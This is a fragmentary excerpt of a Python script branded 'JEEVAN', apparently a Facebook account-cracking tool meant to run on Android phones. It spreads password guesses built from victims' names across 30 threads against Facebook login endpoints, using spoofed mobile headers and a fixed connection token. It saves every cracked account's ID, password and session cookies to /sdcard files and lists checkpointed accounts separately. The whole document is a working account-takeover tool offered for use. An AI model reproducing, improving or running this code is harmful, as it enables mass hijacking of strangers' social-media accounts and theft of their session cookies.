...
for xd in range(10000):
   ...
   i='0'
   j=random.randrange(5670, 6709)
   k=random.randrange(40, 150)
   l='Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]'
   m='\n'
...
from concurrent.futures import ThreadPoolExecutor as JEEVANJEEVAN
from string import * 
...
sys.stdout.write('\x1b]2; JEEVAN\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;37m-----------------------J-----E-----E--------V-------A------N----------------"

\033[1;37m       Owner   :           J  E EVAN ♡
\033[1;37m       Status  :            Free-v.1.1
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back JEEVAN Menu ")
        exit()
def JEEVAN():    
    os.system('clear')
    print(logo)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[JEEVAN] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);JEEVANb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={JEEVANb};{ckkk}"
                    print(f"\r{R} [JEEVAN-OK [🖕🏻]] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/JEEVAN_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/JEEVAN_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [JEEVAN-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/JEEVAN_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[JEEVAN] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    open('/sdcard/JEEVAN_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/JEEVAN_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                      print(f"\r{A} [JEEVAN-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[JEEVAN] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[JEEVAN] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [JEEVAN-OK [🖕🏻]] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/JEEVAN_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with JEEVANJEEVAN(max_workers=30) as JEEVANworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                JEEVANworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                JEEVANworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                JEEVANworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                JEEVANworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
...
def follower():
    ...
    try:
        ...
        try:
            ...
            menu()
        print(f'File Name To Dump Ids. Example /sdcard/JEEVAN.txt') 
        print(47*"-")
